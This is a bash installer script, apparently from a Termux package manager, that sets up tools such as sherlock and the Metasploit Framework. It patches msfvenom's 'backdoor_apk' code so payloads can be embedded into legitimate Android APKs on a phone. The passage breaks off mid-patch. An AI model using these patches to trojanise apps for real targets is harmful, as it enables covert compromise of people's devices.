# ═══════════════════════════════════════════════════════════════════════════════
# BACKENDS DE INSTALAÇÃO (plugin system)
# Cada backend é uma função _backend_<origem> que recebe o nome da ferramenta
# e o campo "repo" do banco de dados.
# ═══════════════════════════════════════════════════════════════════════════════

_backend_apt() {
    local pkg="$1"
    _info "Instalando via apt: $pkg"
    pkg install -y "$pkg" 2>/dev/null || apt-get install -y "$pkg" 2>/dev/null || _die "Falha ao instalar $pkg via apt"
}

_backend_pip() {
    local repo="$1" name="$2"
    # $repo pode ser "owner/projeto" (fallback git) ou o nome exato do pacote PyPI
    # Se repo nao tem "/", é o nome real do pacote no PyPI — tenta ele primeiro
    local pkgname="$name"
    case "$repo" in
        */*) pkgname="$name" ;;   # repo no formato owner/projeto -> usa nome do comando
        *)   pkgname="$repo" ;;   # repo já é o nome exato do pacote PyPI
    esac

    # sherlock: o pandas só é usado para as flags --csv/--xlsx (exportação),
    # mas o build do pandas trava no Termux. Clona, remove o uso de pandas
    # no source e instala localmente — evita a dependência por completo.
    if [ "$name" = "sherlock" ]; then
        _install_sherlock_no_pandas && return 0
        _warn "Rota sem pandas falhou — tentando pip padrão como fallback"
    fi

    _info "Instalando via pip: $pkgname"
    if command -v pip3 &>/dev/null; then
        pip3 install "$pkgname" 2>/dev/null || \
        pip3 install "$name" 2>/dev/null || \
        { case "$repo" in */*) pip3 install "git+https://github.com/${repo}.git" 2>/dev/null ;; esac; } || \
        _die "Falha ao instalar $name via pip"
    elif command -v pip &>/dev/null; then
        pip install "$pkgname" 2>/dev/null || pip install "$name" 2>/dev/null || _die "Falha ao instalar $name via pip"
    else
        _die "pip não encontrado. Instale python-pip primeiro."
    fi
}

_install_sherlock_no_pandas() {
    local dest="$HOME/.xpm/tools/sherlock"
    command -v git &>/dev/null || pkg install -y git || return 1
    rm -rf "$dest" 2>/dev/null
    _info "Clonando sherlock-project (sem pandas)"
    git clone --depth=1 https://github.com/sherlock-project/sherlock.git "$dest" || return 1

    local target="$dest/sherlock_project/sherlock.py"
    [ -f "$target" ] || return 1

    # Remove import pandas e bloco xlsx (sed + awk, sem python)
    sed -i '/^import pandas as pd$/d' "$target"
    awk '
      /^[[:space:]]*if[[:space:]]+args\.xlsx[[:space:]]*:/ { skip=1; indent=0; match($0,/^[[:space:]]*/); indent=RLENGTH; next }
      skip {
        if (/^[[:space:]]*$/) next
        match($0,/^[[:space:]]*/); cur=RLENGTH
        if (cur > indent) next
        skip=0
      }
      { print }
    ' "$target" > "${target}.tmp" && mv "${target}.tmp" "$target"

    # Remove pandas/openpyxl do pyproject.toml para o pip nao tentar buscar de novo
    local pyproj="$dest/pyproject.toml"
    if [ -f "$pyproj" ]; then
        sed -i '/^pandas/d; /"pandas/d; /^openpyxl/d; /"openpyxl/d' "$pyproj"
    fi

    _info "Instalando sherlock localmente (sem pandas)"
    pip3 install "$dest" || return 1

    command -v sherlock &>/dev/null || return 1
    _ok "sherlock instalado sem pandas — flag --xlsx desabilitada (--csv/--txt/--json funcionam normalmente)"
    return 0
}

_backend_go() {
    local repo="$1"
    command -v go &>/dev/null || _die "Go nao encontrado. Instale go primeiro: pkg install golang"
    # repo pode ser "owner/name" simples ou "owner/name/vN/cmd/bin" com path completo
    local pkg="github.com/${repo}@latest"
    _info "Instalando via go install: $pkg"
    # GOBIN=$PREFIX/bin instala o binario direto no PATH do Termux
    GOBIN="$PREFIX/bin" go install -v "$pkg" || _die "Falha ao instalar via go"
}

_backend_cargo() {
    local repo="$1" name="$2"
    _info "Instalando via cargo: $name"
    command -v cargo &>/dev/null || _die "Cargo não encontrado. Instale rust: pkg install rust"
    cargo install "$name" || _die "Falha ao instalar $name via cargo"
}

_backend_gem() {
    local name="$1"
    _info "Instalando via gem: $name"
    command -v gem &>/dev/null || _die "Ruby gem não encontrado. Instale ruby: pkg install ruby"
    gem install "$name" || _die "Falha ao instalar $name via gem"
}

_backend_github() {
    local repo="$1" name="$2"
    local dest="$HOME/.xpm/tools/${name}"
    _info "Clonando de github.com/$repo"
    command -v git &>/dev/null || pkg install -y git || _die "git não encontrado"
    rm -rf "$dest" 2>/dev/null
    git clone --depth=1 "https://github.com/${repo}.git" "$dest" || _die "Falha ao clonar $repo"

    # Alguns pacotes Python (pandas, numpy, lxml...) tem build C pesado e quebram
    # se o pip tentar compilar do source no Termux. Pre-instala via pkg (binario pronto)
    # quando aparecem no requirements.txt, assim o pip so reaproveita o que ja existe.
    for req in "$dest/requirements.txt" "$dest/pyproject.toml"; do
        [ -f "$req" ] || continue
        grep -qi '^pandas\|"pandas\|pandas[<>=]' "$req" 2>/dev/null && pkg install -y python-pandas 2>/dev/null
        grep -qi '^numpy\|"numpy\|numpy[<>=]' "$req" 2>/dev/null && pkg install -y python-numpy 2>/dev/null
        grep -qi '^lxml\|"lxml\|lxml[<>=]' "$req" 2>/dev/null && pkg install -y python-lxml 2>/dev/null
        grep -qi '^pillow\|"pillow\|pillow[<>=]' "$req" 2>/dev/null && pkg install -y python-pillow 2>/dev/null
        grep -qi '^cryptography\|"cryptography\|cryptography[<>=]' "$req" 2>/dev/null && pkg install -y python-cryptography 2>/dev/null
    done

    local pip_ok=0
    if [ -f "$dest/setup.py" ] || [ -f "$dest/pyproject.toml" ]; then
        _info "Instalando pacote Python (pip)"
        if pip3 install "$dest"; then
            pip_ok=1
        else
            _warn "pip install falhou — tentando requirements.txt + wrapper manual"
        fi
    fi

    # Se o pip já criou o comando no PATH (via console_scripts), nao precisa de wrapper
    if [ "$pip_ok" = "1" ] && command -v "$name" &>/dev/null; then
        _ok "$name instalado via pip e disponivel no PATH"
        return 0
    fi

    # Fallback: instala dependencias soltas e cria wrapper manual
    if [ -f "$dest/requirements.txt" ]; then
        _info "Instalando dependências Python (requirements.txt)"
        pip3 install -r "$dest/requirements.txt" || _warn "Algumas dependências podem ter falhado"
    fi

    local entry=""
    for f in "$dest/main.py" "$dest/${name}.py" "$dest/$(basename $repo).py" \
              "$dest/main.sh" "$dest/${name}.sh"; do
        [ -f "$f" ] && entry="$f" && break
    done
    # Procura tambem um nivel dentro (projetos com main.py em subpasta src/<name>/<name>.py)
    if [ -z "$entry" ]; then
        entry=$(find "$dest" -maxdepth 2 -type f \( -name "${name}.py" -o -name "main.py" \) 2>/dev/null | head -1)
    fi

    if [ -n "$entry" ]; then
        local BPFX="${PREFIX:-/data/data/com.termux/files/usr}"
        local ext="${entry##*.}"
        if [ "$ext" = "py" ]; then
            printf '#!/usr/bin/env bash\ncd "%s"\nexec python3 "%s" "$@"\n' "$dest" "$entry" > "$BPFX/bin/$name"
        else
            printf '#!/usr/bin/env bash\ncd "%s"\nexec bash "%s" "$@"\n' "$dest" "$entry" > "$BPFX/bin/$name"
        fi
        chmod +x "$BPFX/bin/$name"
        _ok "Wrapper criado em $BPFX/bin/$name"
    else
        _die "Não foi possível localizar um ponto de entrada executável para $name — instalação incompleta"
    fi

    command -v "$name" &>/dev/null || _die "$name foi instalado mas o comando não está disponível no PATH"
}

_backend_msf() {
    local BPFX="${PREFIX:-/data/data/com.termux/files/usr}"
    local dest="$HOME/.xpm/tools/metasploit"
    local gems="$HOME/.xpm/gems/metasploit"

    # ── 1. Ruby ───────────────────────────────────────────────────────────────
    if ! command -v ruby &>/dev/null; then
        _info "Instalando Ruby..."
        pkg install -y ruby || _die "Falha ao instalar ruby"
    fi
    _ok "Ruby: $(ruby --version 2>/dev/null)"

    # ── 2. Dependências nativas ───────────────────────────────────────────────
    _info "Instalando dependências nativas..."
    # ncurses-utils é OBRIGATÓRIO: provê o binário 'infocmp' que o rb-readline
    # usa para detectar capacidades do terminal. Sem ele, msfconsole crasha
    # com: No such file or directory - infocmp (Errno::ENOENT)
    pkg install -y git libffi libxml2 libxslt sqlite curl \
        openssl libiconv readline zlib clang make pkg-config \
        ncurses-utils python postgresql 2>/dev/null || true

    # ── 2.1 apktool ───────────────────────────────────────────────────────────
    # Dependência do metasploit: msfvenom usa apktool para decompilar/recompilar
    # APKs na hora de embutir payloads Android (backdoor de APK legítimo).
    # Não existe no repo do Termux, então instalamos via xpm/apktool backend.
    hash -r 2>/dev/null || true
    local _apktool_bin; _apktool_bin="$(command -v apktool 2>/dev/null || echo "${PREFIX:-/data/data/com.termux/files/usr}/bin/apktool")"
    [ -f "$_apktool_bin" ] || _apktool_bin=""
    local _apktool_ver
    if [ -n "$_apktool_bin" ]; then
        _apktool_ver="$("$_apktool_bin" --version 2>/dev/null | head -1)"
    fi
    if [ -z "$_apktool_bin" ]; then
        _info "apktool não encontrado — instalando kit APK (dependência do metasploit)..."
        _backend_apkfull
        _mark_installed "apkfull" 2>/dev/null || true
    elif printf '%s' "$_apktool_ver" | grep -qE '^3\.'; then
        _info "apktool $_apktool_ver (3.x) detectado — reinstalando via pkg pra garantir compatibilidade com msfvenom..."
        _backend_apkfull
    else
        _ok "apktool já instalado ($_apktool_ver)"
    fi

    # apksigner é usado pelo apktool/msfvenom pra assinar o APK depois do
    # payload embutido. Cobre também quem já tinha apktool instalado antes
    # dessa dependência existir.
    if ! command -v apksigner &>/dev/null; then
        _info "apksigner não encontrado — instalando (dependência do metasploit)..."
        pkg install -y apksigner 2>/dev/null || _warn "Falha ao instalar apksigner — assine o APK manualmente depois"
    fi

    # Mesma lógica de cobertura pro zipalign: quem instalou o apktool antes
    # do "ms --apk" ganhar validação real de instalabilidade (V15) não tem
    # esse binário ainda. Sem ele não dá pra alinhar o APK corretamente
    # antes de assinar — e o APK Signature Scheme v2/v3 exige exatamente
    # essa ordem (alinhar depois de assinar invalida a assinatura).
    if ! command -v zipalign &>/dev/null; then
        _info "zipalign não encontrado — instalando (necessário pro 'ms --apk' validar instalação)..."
        pkg install -y zipalign 2>/dev/null || _warn "Falha ao instalar zipalign — 'ms --apk' vai pular a validação de alinhamento/instalação"
    fi

    # ── 3. Clona o repositório ────────────────────────────────────────────────
    _info "Clonando metasploit-framework (~67MB)..."
    rm -rf "$dest" 2>/dev/null
    git clone --depth=1 "https://github.com/rapid7/metasploit-framework.git" "$dest" \
        || _die "Falha ao clonar metasploit-framework"

    # ── 3.1 Otimização: remove docs/spec/test/.github (nunca toca módulos) ────
    _msf_optimize_files "$dest"

    # ── 4. GEM_HOME local ────────────────────────────────────────────────────
    mkdir -p "$gems"
    export GEM_HOME="$gems"
    export GEM_PATH="$gems:$(ruby -e 'puts Gem.default_path.join(":")' 2>/dev/null)"
    export PATH="$gems/bin:$PATH"

    # ── 5. Bundler na versão exata do Gemfile.lock ────────────────────────────
    local bundler_ver="2.5.22"
    if [ -f "$dest/Gemfile.lock" ]; then
        local bv
        bv=$(grep -A1 "^BUNDLED WITH" "$dest/Gemfile.lock" | tail -1 | tr -d ' \t')
        [ -n "$bv" ] && bundler_ver="$bv"
    fi
    _info "Instalando bundler $bundler_ver..."
    gem install bundler -v "$bundler_ver" --no-document 2>/dev/null || \
        gem install bundler --no-document 2>/dev/null || \
        _die "Falha ao instalar bundler"
    _ok "Bundler $bundler_ver pronto"

    # ── 6. nokogiri — solução confirmada para Termux/aarch64 ─────────────────
    # Fonte: https://github.com/termux/termux-packages/discussions/27749
    # Passo 1: tenta instalar — vai falhar por causa do gumbo header
    # Passo 2: pega o path do gumbo-parser/src que ficou na gem parcial
    # Passo 3: seta C_INCLUDE_PATH e instala de novo — dessa vez funciona
    _info "Instalando nokogiri (processo em 2 passos para Termux)..."

    # Passo 1: primeira tentativa (esperada falhar, extrai os sources)
    gem install nokogiri --no-document \
        --platform=ruby \
        -- --use-system-libraries \
           "--with-xml2-include=$BPFX/include/libxml2" \
           "--with-xml2-lib=$BPFX/lib" \
           "--with-xslt-include=$BPFX/include" \
           "--with-xslt-lib=$BPFX/lib" 2>/dev/null || true

    # Passo 2: localiza o gumbo-parser/src deixado pela tentativa falha
    local gumbo_src
    gumbo_src=$(find "$gems" "$BPFX/lib/ruby" -type d \
        -path "*/nokogiri-*/gumbo-parser/src" 2>/dev/null | head -1)

    if [ -n "$gumbo_src" ]; then
        _info "Gumbo encontrado em: $gumbo_src"
        export C_INCLUDE_PATH="$gumbo_src"
    else
        _warn "gumbo-parser/src nao encontrado — tentando sem C_INCLUDE_PATH"
    fi

    # Passo 3: instala nokogiri de novo com C_INCLUDE_PATH setado
    _info "Segunda tentativa do nokogiri (com gumbo include path)..."
    gem install nokogiri --no-document \
        --platform=ruby \
        -- --use-system-libraries \
           "--with-xml2-include=$BPFX/include/libxml2" \
           "--with-xml2-lib=$BPFX/lib" \
           "--with-xslt-include=$BPFX/include" \
           "--with-xslt-lib=$BPFX/lib" 2>&1 | tail -5

    if ! gem list nokogiri | grep -q nokogiri; then
        _die "nokogiri nao pode ser instalado neste ambiente. Tente: pkg upgrade && xpm install metasploit"
    fi
    _ok "nokogiri instalado"

    # ── 7. bundle install com nokogiri já satisfeito ──────────────────────────
    cd "$dest" || _die "Nao foi possivel entrar em $dest"

    bundle config set --local path "$gems"
    bundle config set --local without "development test"
    bundle config set --local build.nokogiri \
        "--use-system-libraries --with-xml2-include=$BPFX/include/libxml2 --with-xml2-lib=$BPFX/lib --with-xslt-include=$BPFX/include --with-xslt-lib=$BPFX/lib"

    _info "Instalando gems (5-15min no Termux)..."
    bundle install --jobs=2 2>&1 | grep -vE "^(Fetching|Using|Bundler|$)" || true

    # Verifica se o msfconsole consegue carregar
    if ! bundle exec ruby -e "require 'msf/base'" 2>/dev/null; then
        _warn "Algumas gems podem estar faltando. Se msfconsole falhar, rode:"
        _warn "  cd $dest && bundle install"
    fi

    cd "$HOME" || true

    # ── 8. Wrappers no PATH ───────────────────────────────────────────────────
    local gdp
    gdp=$(ruby -e 'puts Gem.default_path.join(":")' 2>/dev/null || echo "")

    for msf_bin in msfvenom msfdb msfrpc msfrpcd; do
        local src="$dest/$msf_bin"
        [ -f "$src" ] || src="$dest/bin/$msf_bin"
        [ -f "$src" ] || continue
        cat > "$BPFX/bin/$msf_bin" << WEOF
#!/usr/bin/env bash
# Exporta TERM para que rb-readline/infocmp detectem o terminal corretamente.
# Sem isso, msfconsole crasha com: No such file or directory - infocmp
export TERM="${TERM:-xterm-256color}"
export BUNDLE_GEMFILE="$dest/Gemfile"
export GEM_HOME="$gems"
export GEM_PATH="$gems:$gdp"
export PATH="$HOME/.local/bin:$gems/bin:${PREFIX:-/data/data/com.termux/files/usr}/bin:$PATH"
export LD_LIBRARY_PATH="${PREFIX:-/data/data/com.termux/files/usr}/lib:\${LD_LIBRARY_PATH:-}"

# ── heap adaptativo para o apktool interno do msfvenom ──────────────────────
# O msfvenom usa um apktool embutido (java -jar) pra decompilar/recompilar
# APKs com -x. Por padrão a JVM filho herda o heap padrão (~256m), que
# estoura com APKs grandes mesmo que a RAM do aparelho tenha sobrado.
# _JAVA_OPTIONS é lido por QUALQUER JVM filha — incluindo o apktool interno
# do msfvenom — sem precisar modificar o código do Metasploit.
# Calcula 75% da MemAvailable, com mínimo de 512m e máximo de 4096m.
_MSF_XMX="\$(awk '/^MemAvailable:/{v=int(\$2*0.75/1024); if(v<512)v=512; if(v>4096)v=4096; print v; f=1} END{if(!f)print 1536}' /proc/meminfo 2>/dev/null)"
[ -z "\$_MSF_XMX" ] && _MSF_XMX=1536
export _JAVA_OPTIONS="-Xmx\${_MSF_XMX}m"

# Resolve -x e -o para absoluto antes do cd (o bundle exec precisa do cd
# pra encontrar .bundle/config; sem cd trava silenciosamente).
_msf_args=()
_msf_next_abs=0
for _msf_a in "\$@"; do
    if [ "\$_msf_next_abs" = "1" ]; then
        case "\$_msf_a" in
            /*) : ;;
            *)
                if [ -e "\$_msf_a" ]; then
                    _msf_a="\$(readlink -f "\$_msf_a" 2>/dev/null || echo "\$PWD/\$_msf_a")"
                else
                    _msf_a="\$PWD/\$_msf_a"
                fi
                ;;
        esac
        _msf_next_abs=0
    fi
    case "\$_msf_a" in -x|-o) _msf_next_abs=1 ;; esac
    _msf_args+=("\$_msf_a")
done
cd "$dest" || exit 1
exec bundle exec "$msf_bin" "\${_msf_args[@]}"
WEOF
        chmod +x "$BPFX/bin/$msf_bin"
        _ok "Wrapper: $msf_bin"
    done

    # msfconsole tem wrapper próprio (separado do loop acima) pra aplicar o
    # boot enxuto: -q remove o banner ASCII original do Metasploit e a
    # "dica do dia" (custo só visual, sem função nenhuma), RUBYOPT=-W0 cala
    # warnings de depreciação do Ruby/gems. Nada disso toca no msfdb/banco
    # de dados. Pra voltar ao boot padrão com banner original do MSF,
    # exporte ELLIOT_MSF_BANNER=1 antes de rodar.
    #
    # No lugar do banner original, imprime um banner próprio do ElliotOS
    # (ASCII puro com cores ANSI, sem timg/imagem — não pode pesar no boot,
    # já que o objetivo aqui é justamente deixar o start rápido). Pra
    # desligar esse banner também (ex.: uso em script/CI), exporte
    # ELLIOT_BANNER=0.
    cat > "$BPFX/bin/msfconsole" << WEOF
#!/usr/bin/env bash
# XPM_MSF_WRAPPER_ELLIOTOS_BANNER_V1
# Exporta TERM para que rb-readline/infocmp detectem o terminal corretamente.
# Sem isso, msfconsole crasha com: No such file or directory - infocmp
export TERM="${TERM:-xterm-256color}"
export BUNDLE_GEMFILE="$dest/Gemfile"
export GEM_HOME="$gems"
export GEM_PATH="$gems:$gdp"
export PATH="$HOME/.local/bin:$gems/bin:${PREFIX:-/data/data/com.termux/files/usr}/bin:$PATH"
export LD_LIBRARY_PATH="${PREFIX:-/data/data/com.termux/files/usr}/lib:\${LD_LIBRARY_PATH:-}"
export RUBYOPT="\${RUBYOPT:-} -W0"

if [ "\${ELLIOT_BANNER:-1}" = "1" ]; then
    _P=\$'\033[1;35m'; _B=\$'\033[1;34m'; _Y=\$'\033[1;33m'
    _C=\$'\033[1;36m'; _W=\$'\033[1;37m'; _G=\$'\033[1;32m'; _R=\$'\033[0m'
    printf '\n'
    printf '  %s███████╗%s██╗     %s██╗     %s██╗%s ██████╗ %s████████╗%s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
    printf '  %s██╔════╝%s██║     %s██║     %s██║%s██╔═══██╗%s╚══██╔══╝%s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
    printf '  %s█████╗  %s██║     %s██║     %s██║%s██║   ██║%s   ██║   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
    printf '  %s██╔══╝  %s██║     %s██║     %s██║%s██║   ██║%s   ██║   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
    printf '  %s███████╗%s███████╗%s███████╗%s██║%s╚██████╔╝%s   ██║   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_W"
    printf '  %s╚══════╝%s╚══════╝%s╚══════╝%s╚═╝%s ╚═════╝ %s   ╚═╝   %s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_R"
    printf '  %s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌%s\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_R"
    printf '  %sMetasploit Framework%s — %sotimizado por Mike Elliot%s | %sexclusivo no ElliotOS%s\n' "\$_W" "\$_R" "\$_G" "\$_R" "\$_C" "\$_R"
    printf '  %s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌╌%s╌╌╌╌╌╌╌%s\n\n' "\$_P" "\$_B" "\$_B" "\$_Y" "\$_P" "\$_C" "\$_R"
fi

_msf_args=(-q)
[ "\${ELLIOT_MSF_BANNER:-0}" = "1" ] && _msf_args=()
exec bundle exec msfconsole "\${_msf_args[@]}" "\$@"
WEOF
    chmod +x "$BPFX/bin/msfconsole"
    _ok "Wrapper: msfconsole (boot enxuto + banner ElliotOS)"

    # ── 9. Inicializa o banco de dados do Metasploit (msfdb) ──────────────────
    # O xpm so instalava os binarios; o msfdb nunca era inicializado, entao
    # "msfdb start" sempre respondia "No database found". Aqui a gente garante
    # que o postgresql do Termux esta pronto e roda "msfdb init" uma vez.
    _msf_init_database "$BPFX" "$gems" "$gdp" "$dest"

    # ── 10. Fix TMPDIR no apk.rb — msfvenom -x usa /tmp hardcoded ────────────
    # No Termux /tmp não existe; o apk.rb chama apktool internamente e os
    # arquivos temporários ficam em /tmp/... que nunca é criado, causando
    # "No such file or directory @ rb_sysopen - .../original/AndroidManifest.xml"
    # Fix: injetar ENV['TMPDIR'] no topo de backdoor_apk — idempotente.
    _msf_fix_apkrb_tmpdir "$dest"

    _ok "Metasploit instalado! Execute: msfconsole"
    _warn "Primeira execucao demora ~1-2min para carregar modulos."
}

# Fix TMPDIR no apk.rb do Metasploit — msfvenom -x usa /tmp hardcoded.
# No Termux /tmp não existe, só $PREFIX/tmp. Sem isso o msfvenom -x falha com:
#   "No such file or directory @ rb_sysopen - .../original/AndroidManifest.xml"
# Fix do apk.rb do Metasploit para funcionar com APKEditor no Termux.
# 5 patches idempotentes (marcadores V2).
_msf_fix_apkrb_tmpdir() {
    local dest="$1"
    local apkrb="$dest/lib/msf/core/payload/apk.rb"
    [ -f "$apkrb" ] || { _warn "apk.rb nao encontrado — pulando fix"; return 1; }

    # Fix 1: TMPDIR
    if grep -q 'MSF_TMPDIR_FIX_V2' "$apkrb" 2>/dev/null; then
        _ok "apk.rb: TMPDIR ja configurado (V2)"
    else
        _info "apk.rb fix 1: TMPDIR..."
        sed -i '/MSF_TMPDIR_FIX_V1/d' "$apkrb" 2>/dev/null
        sed -i "/def backdoor_apk/a\\    ENV['TMPDIR'] ||= '${TMPDIR:-/data/data/com.termux/files/usr/tmp}' # MSF_TMPDIR_FIX_V2" \
            "$apkrb" 2>/dev/null
        grep -q 'MSF_TMPDIR_FIX_V2' "$apkrb" 2>/dev/null \
            && _ok "apk.rb: TMPDIR configurado" || _warn "Fix 1 nao aplicado"
    fi

    # Fix 2: remove --only-main-classes
    if grep -q 'MSF_APKTOOL_FLAGS_FIX_V2' "$apkrb" 2>/dev/null; then
        _ok "apk.rb: flags ja corrigidas (V2)"
    else
        _info "apk.rb fix 2: --only-main-classes..."
        sed -i '/MSF_APKTOOL_FLAGS_FIX_V1/d' "$apkrb" 2>/dev/null
        sed -i "s/'--only-main-classes', //g;s/\"--only-main-classes\", //g" "$apkrb" 2>/dev/null
        sed -i "/MSF_TMPDIR_FIX_V2/a\\    # MSF_APKTOOL_FLAGS_FIX_V2: --only-main-classes removed" \
            "$apkrb" 2>/dev/null
        grep -q 'MSF_APKTOOL_FLAGS_FIX_V2' "$apkrb" 2>/dev/null \
            && _ok "apk.rb: flags corrigidas" || _warn "Fix 2 nao aplicado"
    fi

    # Fix 3: versao minima apktool
    if grep -q 'MSF_AE_MIN_VER_V2' "$apkrb" 2>/dev/null; then
        _ok "apk.rb: versao minima ja ajustada (V2)"
    elif grep -q "min_required_apktool_version" "$apkrb" 2>/dev/null; then
        _info "apk.rb fix 3: versao minima..."
        sed -i "s/Rex::Version.new('2\.9\.2')/Rex::Version.new('2.0.0') # MSF_AE_MIN_VER_V2/" "$apkrb" 2>/dev/null
        grep -q 'MSF_AE_MIN_VER_V2' "$apkrb" 2>/dev/null \
            && _ok "apk.rb: versao minima -> 2.0.0" || _warn "Fix 3 nao aplicado"
    else
        _ok "apk.rb: check de versao minima nao encontrado (ok)"
    fi

    # Fix 4: run_cmd — popen3 → capture3 (evita deadlock)
    if grep -q 'MSF_AE_RUN_CMD_V2' "$apkrb" 2>/dev/null; then
        _ok "apk.rb: run_cmd ja corrigido (V2)"
    else
        _info "apk.rb fix 4: run_cmd deadlock (capture3)..."
        ruby - "$apkrb" << 'RBFIX4'
src = File.read(ARGV[0])
exit 0 if src.include?('MSF_AE_RUN_CMD_V2')
old = "  def run_cmd(cmd)\n    begin\n      stdin, stdout, stderr = Open3.popen3(*cmd)\n      return stdout.read + stderr.read\n    rescue Errno::ENOENT\n      return nil\n    end\n  end"
new_cmd = "  def run_cmd(cmd) # MSF_AE_RUN_CMD_V2\n    begin\n      stdout_str, stderr_str, _status = Open3.capture3(*cmd)\n      return stdout_str + stderr_str\n    rescue Errno::ENOENT\n      return nil\n    end\n  end"
result = src.include?(old) ? src.sub(old, new_cmd) :
  src.gsub(/  def run_cmd\(cmd\).*?  end\n/m) { |m| m.include?('popen3') ? new_cmd + "\n" : m }
File.write(ARGV[0], result)
RBFIX4
        grep -q 'MSF_AE_RUN_CMD_V2' "$apkrb" 2>/dev/null \
            && _ok "apk.rb: run_cmd corrigido" || _warn "Fix 4 nao aplicado"
    fi

    # Fix 5: hook_point — glob smali* com fallback recursivo
    if grep -q 'MSF_AE_HOOK_V2' "$apkrb" 2>/dev/null; then
        _ok "apk.rb: hook_point ja corrigido (V2)"
    else
        _info "apk.rb fix 5: hook_point (smali* glob)..."
        ruby - "$apkrb" << 'RBFIX5'
src = File.read(ARGV[0])
exit 0 if src.include?('MSF_AE_HOOK_V2')

# Marca o filename
src = src.sub(
  "hookable_class.to_s.gsub('.', '/') + '.smali'\n",
  "hookable_class.to_s.gsub('.', '/') + '.smali' # MSF_AE_HOOK_V2\n"
)

# Substitui lookup de caminho unico por glob multi-path com fallback recursivo
old5 = '    hookable_class_filepath = "#{tempdir}/original/smali/#{hookable_class_filename}"' + "\n" +
       '    smalifile = Dir.glob(hookable_class_filepath).select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first' + "\n" +
       "\n" +
       '    if smalifile.blank?' + "\n" +
       '      raise "Unable to find class file: #{hookable_class_filepath}"' + "\n" +
       '    end'

new5 = '    original_dir = "#{tempdir}/original"' + "\n" +
       '    hookable_class_filepath = "#{original_dir}/smali*/#{hookable_class_filename}"' + "\n" +
       '    smalifile = Dir.glob(hookable_class_filepath).select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first' + "\n" +
       "\n" +
       '    if smalifile.blank?' + "\n" +
       '      # MSF_AE_CLASSES_PATH: APKEditor usa smali/classes/ em vez de smali/' + "\n" +
       '      smalifile = Dir.glob("#{original_dir}/smali*/classes/#{hookable_class_filename}").select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first' + "\n" +
       '    end' + "\n" +
       '    if smalifile.blank?' + "\n" +
       '      smalifile = Dir.glob("#{original_dir}/smali*/**/#{hookable_class_filename}").select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first' + "\n" +
       '    end' + "\n" +
       "\n" +
       '    if smalifile.blank?' + "\n" +
       '      raise "Unable to find class file: #{original_dir}/smali*/#{hookable_class_filename}"' + "\n" +
       '    end'

src = src.sub(old5, new5) if src.include?(old5)
File.write(ARGV[0], src)
RBFIX5
        grep -q 'MSF_AE_HOOK_V2' "$apkrb" 2>/dev/null && grep -q 'MSF_AE_CLASSES_PATH' "$apkrb" 2>/dev/null \
            && _ok "apk.rb: hook_point corrigido (V2+classes)" || _warn "Fix 5 nao aplicado"
    fi

    # Fix 9: FileUtils.rm — path correto (smali/classes/ vs smali/)
    if grep -q 'MSF_AE_RM_FIX_V2' "$apkrb" 2>/dev/null; then
        _ok "apk.rb: FileUtils.rm ja com path correto (Fix 9)"
    else
        _info "apk.rb fix 9: FileUtils.rm smali/classes/ path..."
        ruby - "$apkrb" << 'RBFIX9'
src = File.read(ARGV[0])
exit 0 if src.include?('MSF_AE_RM_FIX_V2')

# Aspas simples: #{tempdir} e #{_pay_stage} sao literais aqui (nao interpolados)
old9 = '    FileUtils.rm "#{tempdir}/payload/smali/com/metasploit/stage/MainActivity.smali"' + "\n" +
       '    FileUtils.rm Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/R*.smali")'

new9 = '    # MSF_AE_RM_FIX_V2' + "\n" +
       '    _pay_stage = Dir.exist?("#{tempdir}/payload/smali/classes") ?' + "\n" +
       '      "#{tempdir}/payload/smali/classes/com/metasploit/stage" :' + "\n" +
       '      "#{tempdir}/payload/smali/com/metasploit/stage"' + "\n" +
       '    FileUtils.rm "#{_pay_stage}/MainActivity.smali" rescue nil' + "\n" +
       '    FileUtils.rm Dir.glob("#{_pay_stage}/R*.smali")'

src = src.sub(old9, new9) if src.include?(old9)
File.write(ARGV[0], src)
RBFIX9
        grep -q 'MSF_AE_RM_FIX_V2' "$apkrb" 2>/dev/null \
            && _ok "apk.rb: RM path corrigido" || _warn "Fix 9 nao aplicado"
    fi

    # Fix 10: end orfao (sobra de fix anterior)
    if grep -qF 'original_dir = "#{tempdir}/original"' "$apkrb" 2>/dev/null && \
       grep -A3 'original_dir.*tempdir.*original' "$apkrb" 2>/dev/null | grep -qx '    end'; then
        _info "apk.rb fix 10: removendo end orfao..."
        ruby - "$apkrb" << 'RBFIX10'
src = File.read(ARGV[0])
old10 = "    original_dir = \"\#{tempdir}/original\"\n\n    end\n\n    hookable_class_filepath"
new10 = "    original_dir = \"\#{tempdir}/original\"\n\n    hookable_class_filepath"
File.write(ARGV[0], src.include?(old10) ? src.sub(old10, new10) : src)
RBFIX10
        _ok "apk.rb: end orfao removido"
    else
        _ok "apk.rb: sem end orfao (Fix 10 nao necessario)"
    fi

    # Fix GLOB: payload smali path (smali/classes/ vs smali/)
    if grep -q 'MSF_AE_PAYLOAD_GLOB_V2' "$apkrb" 2>/dev/null; then
        _ok "apk.rb: payload glob ja corrigido"
    else
        _info "apk.rb fix glob: payload smali/classes/ path..."
        ruby - "$apkrb" << 'RBFIXGLOB'
src = File.read(ARGV[0])
exit 0 if src.include?('MSF_AE_PAYLOAD_GLOB_V2')
old = "    payload_files = Dir.glob(\"\#{tempdir}/payload/smali/com/metasploit/stage/*.smali\")"
